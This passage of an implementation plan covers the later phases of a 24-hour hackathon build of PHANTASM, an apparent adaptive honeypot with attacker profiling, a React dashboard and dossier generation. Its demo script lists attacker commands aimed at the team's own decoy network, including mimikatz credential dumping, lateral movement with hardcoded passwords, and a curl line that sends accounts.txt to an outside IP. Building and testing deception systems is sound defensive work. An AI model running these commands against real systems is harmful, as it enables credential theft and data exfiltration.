+  JOINT WIRE-UP (30 minutes, Member 3 drives):
+    1. Connect ShadowMesh output to MirrorTrap:
+       Fire real Nmap scan at ShadowMesh. Verify event appears in mt:profile channel.
+    2. Verify fc_controller receives mt:profile and evaluates triggers.
+    3. Verify api_server bridges mt:profile to Socket.io. Browser console shows data.
+    4. Verify Socket.io events appear in Zustand store (log store state in console).
+
+  PASS CRITERIA FOR PHASE 3:
+    □ Single Nmap scan → sm:events publish → mt:profile publish → Socket.io event
+      in browser, all within 500ms end-to-end.
+    □ All component health dots green in React dashboard.
+    □ SQLite shows command rows after scan.
+    □ No unhandled exceptions in any process terminal.
+
+
+================================================================================
+PHASE 3 — INTELLIGENCE LAYER
+Hours 12–17 | All Tracks Continue, Integration Focus
+================================================================================
+
+3.0 OBJECTIVE
+─────────────
+Complete the full adaptive feedback loop: topology mutations materialise in
+response to operator profiles, the session lifecycle works end-to-end, and the
+dossier engine produces a complete PDF from a real session record. Phase 3 is
+complete when the full PHANTASM loop runs without manual intervention.
+
+────────────────────────────────────────────────────────────────────────────────
+3.1 FEEDBACK CONTROLLER — FULL TRIGGER LOGIC (Member 3)
+────────────────────────────────────────────────────────────────────────────────
+
+  Hours 12–14: fc_controller.py complete implementation
+
+  Finish all 4 trigger conditions with full mutation directive construction:
+  Each trigger produces a TopologyDirectivePayload (TDP) JSON matching
+  TRD Section 9 / Schema topology_mutations format.
+
+  Crown jewel materialisation TDP (APT-Grade trigger):
+    nodes_to_add: [
+      {hostname: "FINACLE-PROD-DB", ip: "192.168.30.11", role: "core_banking",
+       os: "Windows Server 2019", services: [{port:1433, service:"mssql"}],
+       is_crown_jewel: True},
+      {hostname: "SWIFT-INTERFACE-02", ip: "192.168.30.44", role: "swift_interface",
+       os: "Windows Server 2019", services: [{port:443}], is_crown_jewel: True}
+    ]
+
+  Each mutation also triggers SyntheticDataMutator (sm_synthetic.py):
+    APT-Grade → generate 200 more customer records in FINACLE-PROD-DB,
+                add svc_finacle_prod and svc_swift_admin to AD user pool.
+    Ransomware → surface .bak and .sql files in SMB file listing.
+
+  fc_engagement.py — Engagement Score:
+    engagement_score = (actual_dwell_s / baseline_dwell_s) × technique_depth_weight
+    baseline_dwell_s = 120 (2 minutes — time APT spends before leaving static honeypot)
+    technique_depth_weight = 1.0 + (unique_techniques_count / 20.0)
+    Recomputed on every profile update. Written to Redis + SQLite.
+
+  Test: Inject mock APT-grade profile via Redis → verify mutation directive
+        appears in sm:mutations channel within 2 seconds.
+
+────────────────────────────────────────────────────────────────────────────────
+3.2 SESSION MANAGER — LIFECYCLE + FLUSH WORKER (Member 3, continued)
+────────────────────────────────────────────────────────────────────────────────
+
+  Hours 14–16: session_mgr.py complete
+
+  start_session(attacker_ip=None, entry_protocol=None) → session_id:
+    Generate session_id: f"PH-2026-{datetime.now():%Y%m%d%H%M%S}-{uuid4().hex[:6].upper()}"
+    INSERT into sessions table (created_at, session_state='active', attacker_source_ip, ...)
+    SET Redis: session:{session_id}:state HASH with all fields
+    Publish "session_state_change" to phantasm:dashboard
+    Start flush_worker coroutine
+
+  flush_worker(session_id): runs every 5 seconds
+    Drain command_write_queue (shared asyncio.Queue with mt_engine)
+    Batch INSERT to commands table
+    Batch INSERT to command_techniques table
+    UPDATE sessions: total_commands, unique_techniques
+    PRAGMA wal_checkpoint if write count > 1000
+
+  end_session(session_id):
+    UPDATE sessions: ended_at, duration_seconds, session_state='ended'
+    Final flush (drain all remaining queue items)
+    PRAGMA wal_checkpoint(TRUNCATE)
+    Publish "session_state_change" {'state': 'ended'}
+    Call de_engine.generate_dossier(session_id) — await this
+
+  Test: start_session() → manually inject 10 commands → end_session()
+        Verify sessions row has correct duration, commands table has 10 rows.
+
+────────────────────────────────────────────────────────────────────────────────
+3.3 DOSSIER ENGINE — FULL PIPELINE (Member 4)
+────────────────────────────────────────────────────────────────────────────────
+
+  Hours 12–16: de_engine.py + dossier query execution
+
+  generate_dossier(session_id):
+    1. await execute all 7 aggregation queries from Schema Section 7
+       (session overview, techniques, final profile, stress events,
+        IOCs, host interactions, topology mutations)
+    2. Assemble structured_data dict matching full JSON schema (TRD 11.6)
+    3. Try Claude API (call_llm). On failure: load_cached_narrative().
+    4. Assemble dossier_record: merge structured_data + narrative
+    5. Render HTML from dossier.html.j2 (Jinja2)
+    6. WeasyPrint → PDF: HTML(string=html).write_pdf(pdf_path)
+    7. json.dump dossier_record to json_path
+    8. UPDATE sessions: dossier_generated=TRUE, dossier_path, dossier_json_path
+    9. INSERT dossiers table row
+    10. SET Redis dossier:{session_id}:status = "ready"
+    11. PUBLISH "dossier_ready" event to phantasm:dashboard
+
+  Test: Run full pipeline with fixture session_id from Phase 2 test session.
+  Pass: PDF exists at output/{session_id}_dossier.pdf within 60 seconds.
+        PDF contains all 7 sections. Narrative is 300+ words. IOCs populated.
+
+────────────────────────────────────────────────────────────────────────────────
+3.4 GAN TRAFFIC GENERATOR (Member 1, after Track A milestone)
+────────────────────────────────────────────────────────────────────────────────
+
+  Hours 12–14: sm_traffic_gan.py
+
+  If DCGAN weights available:
+    Load generator.pt on startup.
+    Background coroutine (every 3s): sample 10-30 latent vectors,
+    run generator.forward(z), map feature vectors to Scapy packet fields,
+    emit via raw socket on shadowmesh0.
+
+  If DCGAN not available (use PCAP fallback):
+    Read traffic.pcap via scapy.rdpcap()
+    Loop: re-emit each packet with adjusted timestamp (now - pcap_start + offset)
+    Target: 400-500 packets/minute on shadowmesh0
+
+  Test: tcpdump -i shadowmesh0 -c 100 — should show ambient NTP/DNS/SMB traffic.
+
+────────────────────────────────────────────────────────────────────────────────
+3.5 PHASE 3 EXIT CRITERIA
+────────────────────────────────────────────────────────────────────────────────
+  □ Run demo command sequence (PRD Appendix B) in full:
+    □ Mimikatz command → T1003.001 classified, profile jumps to apt_grade
+    □ APT-grade threshold → mutation directive fires → FINACLE-PROD-DB node appears
+    □ SQL query to FINACLE-PROD-DB → returns fake customer records
+    □ curl C2 callback → IOC captured in iocs table
+    □ end_session() → PDF generated in <60 seconds with all sections
+  □ Dossier PDF: narrative present, techniques table correct, IOC box populated
+  □ Engagement score visible on dashboard profile card
+
+
+================================================================================
+PHASE 4 — SURFACE LAYER
+Hours 12–19 | Member 5 primary, Member 3 support
+================================================================================
+
+4.0 OBJECTIVE
+─────────────
+Build the complete React dashboard that makes PHANTASM's intelligence visually
+stunning and judge-facing. All real-time updates must be live, animated, and
+correct. Phase 4 runs in parallel with Phase 3 — Member 5 does not need Phase 3
+complete to build the UI, only the WebSocket events from Phase 2.
+
+────────────────────────────────────────────────────────────────────────────────
+4.1 D3 NETWORK GRAPH (Hours 12–16)
+────────────────────────────────────────────────────────────────────────────────
+
+  Component: src/components/NetworkGraph.jsx
+  D3 manages its own DOM inside an SVG element. React does NOT re-render D3's SVG.
+  Use useRef for SVG element and D3 simulation. Use useEffect for D3 init (once).
+
+  Initial render (static base topology):
+    Call GET /api/topology on mount.
+    Build D3 node array and link array from topology JSON.
+    Create force simulation (TRD Section 13.4 exact parameters):
+      d3.forceSimulation()
+        .force("link", d3.forceLink().id(d=>d.id).distance(120))
+        .force("charge", d3.forceManyBody().strength(-400))
+        .force("center", d3.forceCenter(width/2, height/2))
+    Draw nodes as SVG circles. Role-based size (servers: r=18, workstations: r=12).
+    Draw edges as SVG lines with directional markers.
+    NODE COLOURS: default → var(--node-default), probed → var(--node-probed),
+      accessed → var(--node-accessed), crown_jewel → var(--node-crown).
+    Apply subtle breathing animation (CSS keyframe scale 1.0→1.05→1.0, 3s, staggered).
+
+  Probe event (host being scanned):
+    On "command_classified" WS event with target_ip:
+      Find D3 node by IP, transition its fill to var(--node-probed) over 300ms.
+      Add amber pulse ring: CSS animation radiating outward, 1.5s cycle.
+
+  Access event (authenticated connection established):
+    Find node, transition fill to var(--node-accessed). Add red glow.
+    Draw directional edge from attacker entry point to this node (amber, animated dash).
+
+  Crown jewel materialisation (on "topology_mutation" WS event):
+    SEQUENCE (total ~1.2 seconds):
+      T+0ms:   Overlay text "CROWN JEWEL MATERIALIZED" fades in (amber, center of graph)
+      T+0ms:   Add new node at random position far from existing graph
+      T+100ms: Spring scale animation: node scale 0→1.2→1.0 (CSS spring ease)
+      T+300ms: Amber ripple ring expands from node center
+      T+600ms: New edges draw progressively (stroke-dashoffset animation) to parent subnet
+      T+800ms: Force simulation: restart with only new node in alpha (localised re-layout)
+      T+1200ms: Overlay text fades out
+    New node glows with var(--glow-node) continuously until clicked.
+
+────────────────────────────────────────────────────────────────────────────────
+4.2 COMMAND FEED (Hours 12–14)
+────────────────────────────────────────────────────────────────────────────────
+
+  Component: src/components/CommandFeed.jsx
+  Subscribed to: store.commands (latest 200)
+
+  Each entry renders as a monospace row:
+    [timestamp] [ATT&CK badge] [command text truncated to 60 chars]
+    Timestamp: session elapsed in MM:SS format (JetBrains Mono)
+    Badge: coloured chip with tactic name. Colours from semantic tactic tokens.
+    Hover: tooltip with full command text + all technique IDs + confidence scores
+
+  On new command received:
+    Framer Motion: translateY(8px)→translateY(0), opacity 0→1, duration 200ms
+    Auto-scroll to bottom (scrollIntoView on the new element)
+    Header counter increments with spring number animation
+
+  Implementation note: Use React.memo on each command row.
+  The list can grow to 200+ items — virtualise with a simple window slice
+  (show only last 30 items in DOM, scroll managed manually) to avoid jank.
+
+────────────────────────────────────────────────────────────────────────────────
+4.3 OPERATOR PROFILE CARD (Hours 14–17)
+────────────────────────────────────────────────────────────────────────────────
+
+  Component: src/components/OperatorProfile.jsx
+  Subscribed to: store.profile, store.stats
+
+  4.3.1 Expertise Gauge (segmented arc):
+    SVG arc from 0° to 270° (leaving gap at bottom).
+    4 segments: script_kiddie (grey), intermediate (blue), advanced (amber), apt_grade (red).
+    Needle: SVG line from arc centre, rotates to current expertise position.
+    Framer Motion: rotate animation, duration 600ms, ease spring.
+    Current level label below arc. Confidence % as small text.
+
+  4.3.2 Objective Confidence Bars:
+    5 horizontal bars, one per objective type.
+    Each bar: label left (12px mono), filled bar (CSS width=score*100%, transition 400ms),
+    percentage right (12px, amber if primary, muted otherwise).
+    Primary objective bar: amber fill + amber label text.
+
+  4.3.3 Operational State Indicator:
+    Large text state name with icon (Lucide React) + colour chip.
+    Icon map: methodical=brain, stressed=zap, disoriented=help-circle,
+              automated=bot, retreating=log-out.
+    State change: Framer Motion fadeIn/Out 300ms.
+    Onset time label: "Since MM:SS"
+
+  4.3.4 Attribution Radar Chart:
+    Recharts RadarChart, top 5 APT groups on axes.
+    Values: overlap_score * 100.
+    Polygon fill: amber at 30% opacity.
+    Axis labels: group name (bold if score > 0.60, i.e. significant overlap).
+
+  Profile update animation (on "profile_update" WS event):
+    Right panel border flashes amber (box-shadow change, 300ms fade out).
+    All 4 sub-components update their values with their individual transitions.
+
+────────────────────────────────────────────────────────────────────────────────
+4.4 STRESS INDEX CHART + BOTTOM BAR (Hours 16–17)
+────────────────────────────────────────────────────────────────────────────────
+
+  Component: src/components/StressChart.jsx
+  Data: store.iciHistory (last 100 points)
+
+  Recharts LineChart (ResponsiveContainer width="100%" height={72}):
+    XAxis: session elapsed time in seconds
+    YAxis: ICI in ms (0 to 30000ms range, auto-shrinks)
+    Line 1: raw ICI values — amber line, strokeWidth=1.5
+    Line 2: 5-point moving average — white line, strokeWidth=2, strokeDasharray="4 2"
+    ReferenceLine: at ICI=3000ms — amber dashed, label "STRESS THRESHOLD"
+    ReferenceArea: between 0 and 3000ms — amber fill, 10% opacity
+    On stress events: ReferenceLine with label annotation at that X position (amber triangle)
+
+  Bottom bar IOC counters:
+    Three counters: "C2 IPs: N" | "PAYLOADS: N" | "ASSETS: N"
+    Updated from store.iocs and store.nodes (accessed count).
+    On IOC added: counter flashes red, then returns to normal.
+
+────────────────────────────────────────────────────────────────────────────────
+4.5 SESSION LIFECYCLE UI (Hours 15–17)
+────────────────────────────────────────────────────────────────────────────────
+
+  IDLE → ACTIVE transition (TRD/WEBSITE_FLOW orchestrated sequence):
+    Implement as Framer Motion timeline in a useEffect watching store.sessionState.
+    Match exact timing from WEBSITE_FLOW Section "IDLE → ACTIVE" (T+0ms to T+2000ms).
+    Key moments: status chip turns green, nodes brighten, overlay text fades, timer starts.
+
+  Dossier notification:
+    On "dossier_ready" WS event:
+      Framer Motion slide-in from bottom-right: div with session summary.
+      "DOSSIER GENERATED — APT-Grade session" with download button.
+      [DOWNLOAD PDF] → GET /api/sessions/{session_id}/dossier/download
+
+  Session controls in header:
+    [▶ START SESSION]: POST /api/sessions/start → transitions to ACTIVE
+    [■ END SESSION]: POST /api/sessions/{id}/end → transitions to DOSSIER
+    [⬇ GENERATE DOSSIER]: POST /api/sessions/{id}/dossier → manual trigger
+
+  Demo control buttons (failsafe — visible in DEMO_MODE):
+    [FORCE APT TRIGGER]: injects mock APT-grade profile to Redis → fires mutation
+    [FORCE DOSSIER]: calls de_engine with current session
+
+────────────────────────────────────────────────────────────────────────────────
+4.6 PHASE 4 EXIT CRITERIA
+────────────────────────────────────────────────────────────────────────────────
+  □ D3 graph: all 15 base nodes visible within 5 seconds of Nmap scan start
+  □ Probe animation plays on each scanned host node
+  □ Crown jewel materialisation sequence plays smoothly (test 3 times, no jank)
+  □ Command feed populates in real-time; auto-scrolls; ATT&CK badges colour-coded
+  □ Expertise gauge needle animates on each profile update
+  □ Objective bars animate to new percentages
+  □ Stress chart draws live; stress threshold line visible; annotation appears
+  □ Dossier notification slides in after PDF generation
+  □ [NEW SESSION] button resets ALL state cleanly (test this — stale state is fatal)
+  □ System health dots all green
+  □ No console errors in browser devtools
+
+
+================================================================================
+PHASE 5 — INTEGRATION, HARDENING, AND DEMO REHEARSAL
+Hours 19–24 | All Members | Non-Negotiable
+================================================================================
+
+5.0 OBJECTIVE
+─────────────
+No new features. No new components. Phase 5 is exclusively: full-pipeline
+integration, bug fixing, stability hardening, performance verification, cached
+fallback testing, and demo rehearsal. The hackathon is won or lost in Phase 5.
+
+────────────────────────────────────────────────────────────────────────────────
+5.1 FULL PIPELINE INTEGRATION (Hours 19–21)
+────────────────────────────────────────────────────────────────────────────────
+
+  Hour 19 — First full integration run (Member 3 drives, all members watch):
+    Start all 8 processes in correct order (TRD Section 22.2):
+      1. docker-compose up -d
+      2. sudo python backend/sm_core.py
+      3. python backend/mt_engine.py
+      4. python backend/fc_controller.py
+      5. python backend/session_mgr.py
+      6. python backend/de_engine.py
+      7. uvicorn api_server:combined_app --port 8000
+      8. cd frontend && npm run build && npx serve -s dist -l 3000
+
+    Execute full demo command sequence from PRD Appendix B:
+      nmap -sV -O 192.168.10.0/24
+      nmap -sV -O 192.168.20.0/24
+      net view \\192.168.10.12
+      nmap -sC -p 389,636,88 192.168.10.31
+      mimikatz "sekurlsa::logonpasswords full"
+      net user administrator /domain
+      net group "Domain Admins" /domain
+      Get-ADUser -Filter * -Properties Department
+      [pause 8 seconds]
+      net use \\192.168.10.55\C$ /user:svc_backup P@ssw0rd123
+      wmic /node:192.168.10.55 process call create "powershell.exe"
+      ipconfig /all
+      dir /s /b *.bak *.sql *.xlsx
+      net share
+      sqlcmd -S 192.168.30.11 -U sa -P Admin123
+      SELECT TOP 10 * FROM customer_accounts
+      curl http://45.12.34.56/exfil -d @accounts.txt
+      [end session]
+
+    Document EVERY failure, error log entry, and missing response.
+
+  Hours 19–21 — Bug fixes, in priority order:
+    P0 (BLOCKING — fix immediately):
+      - NFQueue drops packets without response
+      - BERT inference timeout causes mt_engine to freeze
+      - Redis publish fails silently
+      - Crown jewel materialisation does not trigger
+      - Dossier PDF generation fails
+    P1 (HIGH — fix before rehearsal):
+      - Dashboard nodes not animating correctly
+      - Profile card not updating
+      - Stress chart not drawing live
+      - Session reset leaving stale data in graph
+    P2 (MEDIUM — fix if time allows, else accept):
+      - Minor timing inconsistencies in animations
+      - HTTP emulator missing some response headers
+      - LDAP returning incomplete attribute set
+    P3 (LOW — skip, document for judges as post-hackathon):
+      - PCAP fallback traffic not realistic enough
+      - RDP/FTP emulators not implemented
+
+────────────────────────────────────────────────────────────────────────────────
+5.2 ENVIRONMENT_CHECK.PY — PRE-DEMO VALIDATION (Hours 20–21)
+────────────────────────────────────────────────────────────────────────────────
+
+  python backend/environment_check.py
+  Must PASS (print PASS or FAIL + reason for each):
+    □ Redis PING → PONG
+    □ SQLite: phantasm.db exists, all 14 tables present
+    □ NFQueue: iptables rule set, shadowmesh0 interface up
+    □ BERT ONNX: inference on "nmap -sV" returns T1046 within 500ms
+    □ ATT&CK vectors: group_vectors.npy shape (138, 196) — adjust 196 for actual count
+    □ Redis pub/sub round-trip: publish to sm:events, verify mt_engine receives it
+    □ GET /api/health returns 200 with all components "ok"
+    □ WebSocket test client connects to :8000 and receives heartbeat event
+    □ Nmap scan: nmap -sV 192.168.10.31 shows 3+ services
+    □ LDAP test: ldapsearch -x -H ldap://192.168.10.31 returns user entries
+    □ Dossier fixture: generate_dossier("FIXTURE-SESSION") → PDF in <60s
+    □ Cached dossier: disable API key → fallback narrative returns in <5s
+
+────────────────────────────────────────────────────────────────────────────────
+5.3 PERFORMANCE VERIFICATION (Hour 21)
+────────────────────────────────────────────────────────────────────────────────
+
+  Run 50-command sequence and check performance.log:
+  All of these must pass before demo:
+    □ BERT inference: 95th percentile < 400ms (keyword fallback if not)
+    □ Redis publish to WS delivery: 95th percentile < 100ms
+    □ Topology mutation (FC fires to new node visible in graph): < 5 seconds
+    □ SQLite batch flush: each 5s flush < 50ms
+    □ API endpoints: /api/health, /api/topology < 200ms response
+
+  If BERT inference > 400ms:
+    mt_engine.py: set USE_KEYWORD_FALLBACK_ONLY=True
+    Restart mt_engine. Re-test. This reduces classification to keyword-only
+    but meets latency budget. Classification still works — just less nuanced.
+
+────────────────────────────────────────────────────────────────────────────────
+5.4 DEMO REHEARSAL (Hours 22–24)
+────────────────────────────────────────────────────────────────────────────────
+
+  RULE: Minimum 3 full rehearsals on the EXACT demo hardware before presenting.
+  The demo operator (Member 6 or lead member) must run the command sequence
+  from memory — no reading from another screen.
+
+  Rehearsal checklist before each run:
+    □ Display set to 1920×1080 (or 1440×900)
+    □ Browser zoom at 100%
+    □ All browser extensions disabled
+    □ Laptop plugged into power
+    □ All 8 processes running (verify with tmux pane check)
+    □ All 3 system status dots green on dashboard
+    □ No stale session state (click [NEW SESSION] to reset)
+    □ Attacker terminal ready (separate tmux pane or separate terminal window)
+    □ Backup command sequence pre-typed in second terminal (do not execute)
+
+  Target: each rehearsal completes within 90 seconds with all 7 integration
+  test outcomes from TRD Section 25.3 achieved.
+
+  After 3 successful rehearsals:
+    □ Generate and print the cached dossier (physical prop for judge)
+    □ Pre-generate 2 backup dossiers for different session profiles
+    □ Prepare judge Q&A answers (likely questions: How does BERT work? How is
+      APT attribution scored? What makes it different from Cowrie? How would
+      CERT-In use this? What does the dossier contain?)
+    □ Final PPT review (slides should reference dashboard screenshots from
+      a successful rehearsal run)
+
+────────────────────────────────────────────────────────────────────────────────
+5.5 FAILURE RECOVERY PROCEDURES (all members must memorise)
+────────────────────────────────────────────────────────────────────────────────
+
+  SCENARIO — NFQueue stops responding:
+    sudo iptables -D INPUT -i shadowmesh0 -j NFQUEUE --queue-num 1
+    sudo iptables -I INPUT -i shadowmesh0 -j NFQUEUE --queue-num 1
+    pkill -f sm_core.py && sudo python backend/sm_core.py &
+    Recovery: ~30 seconds
+
+  SCENARIO — Redis crashes:
+    docker-compose restart redis
+    All components auto-reconnect (retry backoff: 1s→2s→4s)
+    Recovery: ~10 seconds
+
+  SCENARIO — BERT too slow during demo:
+    In mt_engine terminal: Ctrl+C
+    Edit: USE_KEYWORD_FALLBACK_ONLY=True in mt_engine.py
+    python backend/mt_engine.py &
+    Recovery: ~10 seconds. Classification continues, slightly less accurate.
+
+  SCENARIO — WebSocket drops:
+    Socket.io auto-reconnects in 3-5 seconds. No action needed.
+    If does not reconnect: browser refresh. State restores via "request_snapshot".
+
+  SCENARIO — Claude API fails during dossier generation:
+    Cached fallback fires automatically if API call fails or times out.
+    Dossier PDF still generates from cached narrative.
+    Judge does not see a difference in the output.
+
+  SCENARIO — React dashboard crashes (white screen):
+    Browser refresh. Socket.io reconnects. Request "request_snapshot" fires.
+    If still broken: switch to pre-built production serve (npx serve -s dist).
+
+────────────────────────────────────────────────────────────────────────────────
+5.6 PHASE 5 EXIT CRITERIA (FINAL GO/NO-GO FOR DEMO)
+────────────────────────────────────────────────────────────────────────────────
+
+  ALL of the following must be TRUE before presenting to judges:
+  □ environment_check.py: all 12 checks PASS
+  □ 3/3 rehearsal runs complete in ≤90 seconds with 7/7 integration outcomes
+  □ Cached dossier fallback confirmed working (disconnect API key, run again)
+  □ Printed dossier prop in hand
+  □ [NEW SESSION] state reset confirmed working after each rehearsal
+  □ Backup command sequence ready in separate terminal
+  □ All team members know their Q&A answers
+  □ Demo laptop plugged in, display set, browser ready, extensions disabled
+
+
+================================================================================
+APPENDIX A — MEMBER RESPONSIBILITY MATRIX
+================================================================================
+
+  Member 1 — ShadowMesh Lead
+    OWNS:     sm_core.py, sm_topology.py, sm_services/ (all emulators),
+              sm_traffic_gan.py, sm_synthetic.py
+    SUPPORTS: Integration debugging (network layer)
+    PHASE 5:  NFQueue reliability, service emulator edge cases
+
+  Member 2 — MirrorTrap AI Lead
+    OWNS:     mt_engine.py, mt_classifier.py, mt_expertise.py,
+              mt_timing.py, mt_attribution.py, model download+conversion
+    SUPPORTS: Phase 1 model asset staging
+    PHASE 5:  Classifier accuracy verification, ONNX inference benchmark
+
+  Member 3 — Integration + Feedback
+    OWNS:     api_server.py, api_models.py, fc_controller.py, fc_triggers.py,
+              fc_engagement.py, session_mgr.py, docker-compose.yml, setup.sh
+    SUPPORTS: All inter-component wiring during Phase 2 checkpoint + Phase 5
+    PHASE 5:  environment_check.py, full pipeline integration, bug triage
+
+  Member 4 — Dossier + Database
+    OWNS:     db/schema.py, db/migrations.py, db/queries.py, db/init_synthetic.py,
+              de_engine.py, de_prompt.py, de_renderer.py, dossier.html.j2,
+              backend/static/ (fonts, CSS for PDF)
+    SUPPORTS: SQLite query optimisation, synthetic data generation
+    PHASE 5:  Dossier generation timing, PDF quality check, cached fallback
+
+  Member 5 — Frontend Dashboard
+    OWNS:     All React components, Zustand store, CSS token system,
+              socket.js WebSocket service, D3 graph, all animations
+    SUPPORTS: Dashboard performance during integration
+    PHASE 5:  Animation timing, stale state cleanup, responsive layout at demo res
+
+  Member 6 — Demo Operator + PPT (if 6-member team)
+    OWNS:     Presentation slides, demo script narration, printed dossier prop
+    SUPPORTS: Backup command sequence preparation, rehearsal coordination
+    PHASE 5:  Runs all 3 rehearsals, prepares judge Q&A, prints dossier
+
+
+================================================================================
+APPENDIX B — CRITICAL PATH SUMMARY
+================================================================================
+
+  Hour  0–1:   EVERYONE — Environment setup + Redis + shadowmesh0 up
+  Hour  1–3:   M4: DB init + synthetic bootstrap | M2: model download
+  Hour  3–12:  PARALLEL — 5 tracks, 5 members, no blockers between tracks
+  Hour  12:    CHECKPOINT — wire-up integration test. Fix before proceeding.
+  Hour 12–17:  M3: FC + session_mgr | M4: dossier engine | M5: React components
+  Hour 17–19:  ALL — Phase 4 polish + full pipeline dry run
+  Hour 19–21:  ALL — Integration bugs fix + environment_check.py pass
+  Hour 21–22:  ALL — Performance verification + stability hardening
+  Hour 22–24:  ALL — 3× demo rehearsal + printed dossier + judge Q&A prep
+  Hour 24:     PRESENT
+
+  HARD RULE: If any single component is not at its Phase 2 milestone by Hour 12,
+  the team lead makes the call — implement the documented fallback for that component
+  immediately (keyword-only MT, PCAP traffic, cached dossier) and mark that
+  component as "demo-stable fallback mode". A working demo with fallbacks beats
+  a broken demo with complete components every time.
+
+================================================================================
+                 PHANTASM IMPLEMENTATION PLAN v1.0 — COMPLETE
+              9 Components | 5 Phases | 24 Hours | 5 Members
+          "The attacker has nothing. We have everything."
+     SIH 2026 | VIT Vellore | Track: Blockchain & Cybersecurity
+================================================================================
